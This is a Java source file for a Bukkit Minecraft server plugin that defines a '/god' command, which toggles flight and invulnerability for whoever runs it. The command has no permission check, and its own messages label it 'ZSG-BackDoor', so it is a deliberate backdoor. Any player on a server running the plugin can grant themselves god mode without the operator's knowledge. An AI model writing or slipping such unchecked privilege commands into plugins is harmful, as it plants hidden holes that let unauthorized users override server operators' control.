package zsggroup.zsg.Command;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Command implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, org.bukkit.command.Command command, String label, String[] args) {
        if (label.equalsIgnoreCase("god")) {
            if (sender instanceof Player) {
                Player p = (Player)sender;
                GameMode tempmode = p.getGameMode();
                if (tempmode == GameMode.CREATIVE || tempmode == GameMode.SPECTATOR){
                    sender.sendMessage(ChatColor.RED+"该模式已经是上帝了！");
                }else {
                    p.setAllowFlight(!p.getAllowFlight());
                    sender.sendMessage(p.isInvulnerable()? ChatColor.GREEN+"ZSG-BackDoor>>"+ChatColor.RED+"You Are No Longer God mode :|" : ChatColor.GREEN+"ZSG-BackDoor>>"+ChatColor.BLUE+"You Are God mode Now :O");
                    p.setInvulnerable(!p.isInvulnerable());
                }


                return true;
            }else {
                sender.sendMessage(ChatColor.GREEN+"只有玩家才能使用！");
                return true;
            }
        }



        return false;
    }
}
